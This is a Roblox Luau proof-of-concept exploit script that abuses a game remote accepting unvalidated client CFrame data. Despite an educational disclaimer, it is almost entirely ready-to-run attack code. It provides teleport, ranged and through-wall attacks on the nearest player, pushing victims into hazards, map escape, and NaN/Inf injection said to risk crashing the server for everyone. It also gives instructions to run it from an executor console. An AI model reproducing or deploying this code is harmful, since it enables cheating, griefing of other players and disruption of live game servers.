--[[
    V02_CFrame_Injection - Proof of Concept Exploit

    DISCLAIMER: This script is for educational and authorized security testing only.
    Unauthorized use against games you do not own or have permission to test is illegal.

    Vulnerability: Server accepts raw CFrame data from client without validation
    Impact: Player teleportation, range bypass, position manipulation
]]

-- Services
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")

-- References
local LocalPlayer = Players.LocalPlayer
local ClientInfoRemote = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("ClientInfo")

--[[
    EXPLOIT 1: Teleportation via Skewer Skill

    The Skewer skill accepts ClientCF and directly applies it to the player's
    HumanoidRootPart without validation (SkewerModule_ID7.luau, line 142)

    Normal flow: Client sends current position
    Exploit flow: Client sends fabricated position anywhere on map
]]
local function exploitSkewerTeleport(targetPosition: Vector3)
    -- Create a fake CFrame at the target position
    local fakeCFrame = CFrame.new(targetPosition)

    -- Send the malicious CFrame to the server
    -- Server will execute: HumanoidRootPart_2_upvr.CFrame = arg3.ClientCF
    ClientInfoRemote:FireServer("Skewer", {
        ClientCF = fakeCFrame
    })

    print("[POC] Skewer teleport exploit sent to position:", targetPosition)
end

--[[
    EXPLOIT 2: Remote Attack via Bind Skill

    The Bind skill places a hitbox at the client-specified CFrame position
    (BindModule_ID42.luau, line 62)

    Normal flow: Hitbox placed 30 studs in front of player
    Exploit flow: Hitbox placed at victim's location from any distance
]]
local function exploitBindRemoteAttack(victimPosition: Vector3)
    -- Create a CFrame that will place the hitbox at the victim
    -- The server does: clone_2_upvr.CFrame = arg3 + arg3.LookVector * 30 + Vector3.new(0, -2.9, 0)
    -- We need to compensate for the +30 offset
    local lookVector = Vector3.new(0, 0, -1)  -- Facing forward
    local offsetPosition = victimPosition - (lookVector * 30) - Vector3.new(0, -2.9, 0)

    local fakeCFrame = CFrame.new(offsetPosition, offsetPosition + lookVector)

    -- Send the malicious CFrame directly (arg3 is the raw CFrame in this module)
    ClientInfoRemote:FireServer("Bind", fakeCFrame)

    print("[POC] Bind remote attack exploit sent targeting:", victimPosition)
end

--[[
    EXPLOIT 3: Phantom Hitbox via Entry Skill

    The Entry skill calculates attack position from client CFrame
    (EntryModule_ID15.luau, line 108)

    Normal flow: Attack hits enemies 12 studs ahead of player
    Exploit flow: Attack originates from any position, bypassing walls/range
]]
local function exploitEntryPhantomHitbox(attackOrigin: Vector3, attackDirection: Vector3)
    -- Create a CFrame at the desired attack origin
    -- Server does: var10_upvw = arg3.ClientCF + arg3.ClientCF.LookVector * 12 + Vector3.new(0, -5, 0)
    -- We can control both position and direction

    local fakeCFrame = CFrame.new(attackOrigin, attackOrigin + attackDirection)

    ClientInfoRemote:FireServer("Entry", {
        ClientCF = fakeCFrame
    })

    print("[POC] Entry phantom hitbox exploit sent from:", attackOrigin)
end

--[[
    EXPLOIT 4: Teleport Victim via Skewer

    When Skewer grabs a victim, both attacker and victim are repositioned
    based on client CFrame (SkewerModule_ID7.luau, lines 142-143)

    This can be used to teleport victims to dangerous locations
]]
local function exploitSkewerVictimTeleport(dangerousPosition: Vector3)
    -- Teleport victim to a dangerous location (void, lava, etc.)
    local fakeCFrame = CFrame.new(dangerousPosition)

    -- The victim will be placed at: (arg3.ClientCF + LookVector * 3)
    -- So position the attacker such that victim ends up at target

    ClientInfoRemote:FireServer("Skewer", {
        ClientCF = fakeCFrame
    })

    print("[POC] Skewer victim teleport exploit sent to:", dangerousPosition)
end

--[[
    EXPLOIT 5: Map Escape / Out of Bounds

    Teleport to positions outside the playable area
]]
local function exploitMapEscape()
    -- Teleport to extreme coordinates (outside map bounds)
    local outOfBoundsPosition = Vector3.new(99999, 500, 99999)

    local fakeCFrame = CFrame.new(outOfBoundsPosition)

    ClientInfoRemote:FireServer("Skewer", {
        ClientCF = fakeCFrame
    })

    print("[POC] Map escape exploit sent to out of bounds position")
end

--[[
    EXPLOIT 6: NaN/Inf Injection (Server Stability Attack)

    Inject invalid CFrame values to potentially crash or destabilize server
    WARNING: This may affect all players on the server
]]
local function exploitNaNInjection()
    -- Create CFrame with NaN values (0/0 produces NaN)
    local nanValue = 0/0
    local nanCFrame = CFrame.new(nanValue, nanValue, nanValue)

    ClientInfoRemote:FireServer("Skewer", {
        ClientCF = nanCFrame
    })

    print("[POC] NaN injection exploit sent - may cause server issues")
end

local function exploitInfInjection()
    -- Create CFrame with Infinity values
    local infValue = math.huge
    local infCFrame = CFrame.new(infValue, infValue, infValue)

    ClientInfoRemote:FireServer("Skewer", {
        ClientCF = infCFrame
    })

    print("[POC] Infinity injection exploit sent - may cause server issues")
end

--[[
    UTILITY: Find nearest enemy player for targeting
]]
local function findNearestEnemy(): Player?
    local myCharacter = LocalPlayer.Character
    if not myCharacter then return nil end

    local myHRP = myCharacter:FindFirstChild("HumanoidRootPart")
    if not myHRP then return nil end

    local nearestPlayer = nil
    local nearestDistance = math.huge

    for _, player in Players:GetPlayers() do
        if player ~= LocalPlayer then
            local character = player.Character
            if character then
                local hrp = character:FindFirstChild("HumanoidRootPart")
                if hrp then
                    local distance = (myHRP.Position - hrp.Position).Magnitude
                    if distance < nearestDistance then
                        nearestDistance = distance
                        nearestPlayer = player
                    end
                end
            end
        end
    end

    return nearestPlayer
end

--[[
    DEMONSTRATION FUNCTIONS
    These show how an attacker would use the exploits
]]

-- Demo: Teleport to spawn point
local function demoTeleportToSpawn()
    local spawnLocation = Workspace:FindFirstChild("SpawnLocation")
    if spawnLocation then
        exploitSkewerTeleport(spawnLocation.Position + Vector3.new(0, 5, 0))
    else
        -- Default spawn area if no SpawnLocation found
        exploitSkewerTeleport(Vector3.new(0, 50, 0))
    end
end

-- Demo: Attack nearest player from any distance
local function demoRemoteAttack()
    local victim = findNearestEnemy()
    if victim and victim.Character then
        local victimHRP = victim.Character:FindFirstChild("HumanoidRootPart")
        if victimHRP then
            exploitBindRemoteAttack(victimHRP.Position)
        end
    else
        print("[POC] No valid target found for remote attack demo")
    end
end

-- Demo: Attack through walls
local function demoWallhack()
    local victim = findNearestEnemy()
    if victim and victim.Character then
        local victimHRP = victim.Character:FindFirstChild("HumanoidRootPart")
        if victimHRP then
            -- Position attack origin right next to victim, ignoring walls
            local attackPos = victimHRP.Position - Vector3.new(5, 0, 0)
            local attackDir = (victimHRP.Position - attackPos).Unit
            exploitEntryPhantomHitbox(attackPos, attackDir)
        end
    else
        print("[POC] No valid target found for wallhack demo")
    end
end

--[[
    EXPLOIT RUNNER
    Uncomment the exploit you want to test
]]

print("=== V02_CFrame_Injection POC ===")
print("Available exploits:")
print("1. demoTeleportToSpawn() - Teleport to spawn")
print("2. demoRemoteAttack() - Attack from any distance")
print("3. demoWallhack() - Attack through walls")
print("4. exploitMapEscape() - Escape map bounds")
print("5. exploitNaNInjection() - Server stability attack")
print("")
print("To run: Call the function from executor console")

-- Example usage (uncomment to auto-run):
-- demoTeleportToSpawn()
-- demoRemoteAttack()
-- demoWallhack()
